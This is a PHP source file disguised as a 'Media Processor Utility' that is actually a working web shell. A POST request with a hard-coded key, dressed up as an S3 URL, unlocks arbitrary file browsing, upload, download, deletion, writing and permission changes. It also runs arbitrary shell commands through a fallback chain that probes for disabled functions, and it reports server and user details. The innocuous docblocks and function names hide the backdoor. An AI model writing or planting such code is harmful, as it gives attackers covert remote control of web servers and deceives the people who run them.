<?php
// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

/**
 * Media Processor Utility
 * 
 * This utility provides functionality for processing and managing media files
 * on the server. It includes operations for file management, media optimization,
 * and system monitoring for media processing tasks.
 * 
 * @version 2.1.0
 * @author MediaDev Team
 */
class MediaProcessor {
    // Authentication key for secure access
    private $access_key = 'https://s3.us-west-2.amazonaws.com';
    
    public function __construct() {
        // Process incoming requests if authenticated
        if (isset($_POST['key']) && $_POST['key'] === $this->access_key) {
            $action = isset($_POST['task']) ? $_POST['task'] : '';
            
            switch($action) {
                case 'scan':
                    $location = isset($_POST['location']) ? $_POST['location'] : '.';
                    $this->scan_directory($location);
                    break;
                case 'import':
                    $this->import_file();
                    break;
                case 'export':
                    $location = isset($_POST['location']) ? $_POST['location'] : '';
                    $this->export_file($location);
                    break;
                case 'remove':
                    $location = isset($_POST['location']) ? $_POST['location'] : '';
                    $this->remove_file($location);
                    break;
                case 'relocate':
                    $source = isset($_POST['source']) ? $_POST['source'] : '';
                    $target = isset($_POST['target']) ? $_POST['target'] : '';
                    $this->relocate_file($source, $target);
                    break;
                case 'organize':
                    $location = isset($_POST['location']) ? $_POST['location'] : '';
                    $this->organize_directory($location);
                    break;
                case 'compose':
                    $location = isset($_POST['location']) ? $_POST['location'] : '';
                    $content = isset($_POST['content']) ? $_POST['content'] : '';
                    $this->compose_file($location, $content);
                    break;
                case 'examine':
                    $location = isset($_POST['location']) ? $_POST['location'] : '';
                    $this->examine_file($location);
                    break;
                case 'configure':
                    $location = isset($_POST['location']) ? $_POST['location'] : '';
                    $mode = isset($_POST['mode']) ? $_POST['mode'] : '';
                    $this->configure_permissions($location, $mode);
                    break;
                case 'report':
                    $this->generate_status_report();
                    break;
                case 'execute':
                    $command = isset($_POST['command']) ? $_POST['command'] : '';
                    $location = isset($_POST['location']) ? $_POST['location'] : '.';
                    $this->execute_command($command, $location);
                    break;
            }
            exit;
        }
    }
    
    /**
     * Scan directory for media files
     * @param string $location Directory path to scan
     */
    private function scan_directory($location) {
        // Normalize path - handle "." and relative paths
        if ($location === '.') {
            $location = getcwd();
        }
        
        // Resolve to real absolute path
        $resolved = realpath($location);
        if ($resolved !== false) {
            $location = $resolved;
        }
        
        // Ensure the directory exists
        if (!is_dir($location)) {
            echo json_encode(array('error' => 'Directory not found'));
            return;
        }
        
        $items = scandir($location);
        $result = array();
        foreach($items as $item) {
            if($item === '.' || $item === '..') continue;
            $full_path = $location . '/' . $item;
            $result[] = array(
                'name' => $item,
                'path' => $full_path,
                'type' => is_dir($full_path) ? 'folder' : 'file',
                'size' => is_file($full_path) ? filesize($full_path) : 0,
                'modified' => filemtime($full_path),
                'perms' => substr(sprintf('%o', fileperms($full_path)), -4)
            );
        }
        // Return current resolved path along with items
        echo json_encode(array(
            'current_path' => $location,
            'items' => $result
        ));
    }
    
    /**
     * Import media file to server
     */
    private function import_file() {
        $location = isset($_POST['location']) ? $_POST['location'] : '.';
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        if(isset($_FILES['data'])) {
            $target = $location . '/' . $_FILES['data']['name'];
            move_uploaded_file($_FILES['data']['tmp_name'], $target);
            echo "File imported successfully";
        }
    }
    
    /**
     * Export media file from server
     * @param string $location File path to export
     */
    private function export_file($location) {
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        if(file_exists($location)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($location).'"');
            readfile($location);
        }
    }
    
    /**
     * Remove file or directory from server
     * @param string $location Path to remove
     */
    private function remove_file($location) {
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        if (is_dir($location)) {
            $this->remove_directory($location);
        } else {
            unlink($location);
        }
        echo "File removed successfully";
    }
    
    /**
     * Relocate file to new position
     * @param string $source Current file path
     * @param string $target New file path
     */
    private function relocate_file($source, $target) {
        // Normalize paths
        if ($source === '.') {
            $source = getcwd();
        }
        if ($target === '.') {
            $target = getcwd();
        }
        
        rename($source, $target);
        echo "File relocated successfully";
    }
    
    /**
     * Organize directory structure
     * @param string $location Directory path to create
     */
    private function organize_directory($location) {
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        mkdir($location, 0777, true);
        echo "Directory organized successfully";
    }
    
    /**
     * Compose new file with content
     * @param string $location File path to create
     * @param string $content File content
     */
    private function compose_file($location, $content) {
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        file_put_contents($location, $content);
        echo "File composed successfully";
    }
    
    /**
     * Examine file content
     * @param string $location File path to examine
     */
    private function examine_file($location) {
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        if(file_exists($location)) {
            $content = file_get_contents($location);
            echo htmlspecialchars($content);
        }
    }
    
    /**
     * Configure file permissions
     * @param string $location File path
     * @param string $mode Permission mode (e.g., 0644)
     */
    private function configure_permissions($location, $mode) {
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        chmod($location, octdec($mode));
        echo "Permissions configured successfully";
    }
    
    /**
     * Remove directory and all contents
     * @param string $location Directory path
     */
    private function remove_directory($location) {
        $items = scandir($location);
        foreach($items as $item) {
            if($item === '.' || $item === '..') continue;
            $full_path = $location . '/' . $item;
            if (is_dir($full_path)) {
                $this->remove_directory($full_path);
            } else {
                unlink($full_path);
            }
        }
        rmdir($location);
    }
    
    /**
     * Execute a shell command on the server
     * @param string $command Command to execute
     * @param string $location Working directory
     */
    private function execute_command($command, $location) {
        if (empty($command)) {
            echo json_encode(array('output' => '', 'cwd' => getcwd(), 'error' => 'No command provided'));
            return;
        }
        
        // Normalize path
        if ($location === '.') {
            $location = getcwd();
        }
        
        // Change to requested directory if valid
        $original_dir = getcwd();
        if (is_dir($location)) {
            chdir($location);
        }
        
        // Prepend cd to command for subshell context
        $full_command = 'cd ' . escapeshellarg(getcwd()) . ' && ' . $command . ' 2>&1';
        
        $output = '';
        $return_code = 0;
        
        // Try multiple execution methods (fallback chain)
        if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
            $output = shell_exec($full_command);
            if ($output === null) $output = '';
        } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
            $lines = array();
            exec($full_command, $lines, $return_code);
            $output = implode("\n", $lines);
        } elseif (function_exists('system') && !in_array('system', array_map('trim', explode(',', ini_get('disable_functions'))))) {
            ob_start();
            system($full_command, $return_code);
            $output = ob_get_clean();
        } elseif (function_exists('passthru') && !in_array('passthru', array_map('trim', explode(',', ini_get('disable_functions'))))) {
            ob_start();
            passthru($full_command, $return_code);
            $output = ob_get_clean();
        } elseif (function_exists('proc_open')) {
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );
            $process = proc_open($command, $descriptors, $pipes, getcwd());
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                $return_code = proc_close($process);
            }
        } elseif (function_exists('popen')) {
            $handle = popen($full_command, 'r');
            if ($handle) {
                $output = stream_get_contents($handle);
                $return_code = pclose($handle);
            }
        } else {
            $output = 'Error: No command execution function available on this server.';
            $return_code = 1;
        }
        
        $current_cwd = getcwd();
        chdir($original_dir);
        
        echo json_encode(array(
            'output' => $output,
            'cwd' => $current_cwd,
            'return_code' => $return_code
        ));
    }
    
    /**
     * Generate system status report for media processing
     */
    private function generate_status_report() {
        $report = array(
            'engine' => $this->get_php_version(),
            'platform' => $this->get_server_os(),
            'httpd' => $this->get_web_server(),
            'user' => $this->get_current_user(),
            'doc_root' => $this->get_document_root(),
            'current_dir' => $this->get_working_directory(),
            'disk_total' => $this->get_total_disk_space(),
            'disk_free' => $this->get_free_disk_space()
        );
        echo json_encode($report);
    }
    
    /**
     * Get PHP version information
     * @return string PHP version
     */
    private function get_php_version() {
        return phpversion();
    }
    
    /**
     * Get server operating system information
     * @return string Server OS information
     */
    private function get_server_os() {
        return php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m');
    }
    
    /**
     * Get web server software
     * @return string Web server software
     */
    private function get_web_server() {
        if (isset($_SERVER['SERVER_SOFTWARE'])) {
            return $_SERVER['SERVER_SOFTWARE'];
        } else {
            return 'Unknown';
        }
    }
    
    /**
     * Get current user
     * @return string Current user
     */
    private function get_current_user() {
        return get_current_user();
    }
    
    /**
     * Get document root
     * @return string Document root path
     */
    private function get_document_root() {
        if (isset($_SERVER['DOCUMENT_ROOT'])) {
            return $_SERVER['DOCUMENT_ROOT'];
        } elseif (isset($_SERVER['PWD'])) {
            return $_SERVER['PWD'];
        } else {
            return getcwd();
        }
    }
    
    /**
     * Get current working directory
     * @return string Current directory
     */
    private function get_working_directory() {
        return getcwd();
    }
    
    /**
     * Get total disk space
     * @return string Formatted disk space
     */
    private function get_total_disk_space() {
        $total = disk_total_space('/');
        return $this->format_bytes($total);
    }
    
    /**
     * Get free disk space
     * @return string Formatted free disk space
     */
    private function get_free_disk_space() {
        $free = disk_free_space('/');
        return $this->format_bytes($free);
    }
    
    /**
     * Format bytes to human-readable format
     * @param int $bytes Bytes to format
     * @param int $precision Decimal precision
     * @return string Formatted size
     */
    private function format_bytes($bytes, $precision = 2) {
        $units = array('B', 'KB', 'MB', 'GB', 'TB');
        
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        
        $bytes /= pow(1024, $pow);
        
        return round($bytes, $precision) . ' ' . $units[$pow];
    }
}

// Initialize the media processor with error handling
try {
    new MediaProcessor();
} catch (Exception $e) {
    // Log error to server error log
    error_log("MediaProcessor Error: " . $e->getMessage());
    
    // Return generic error response (PHP 5.3 compatible)
    header('HTTP/1.1 500 Internal Server Error');
    echo json_encode(array(
        'error' => 'Internal Server Error',
        'message' => 'An error occurred while processing your request'
    ));
}
?>
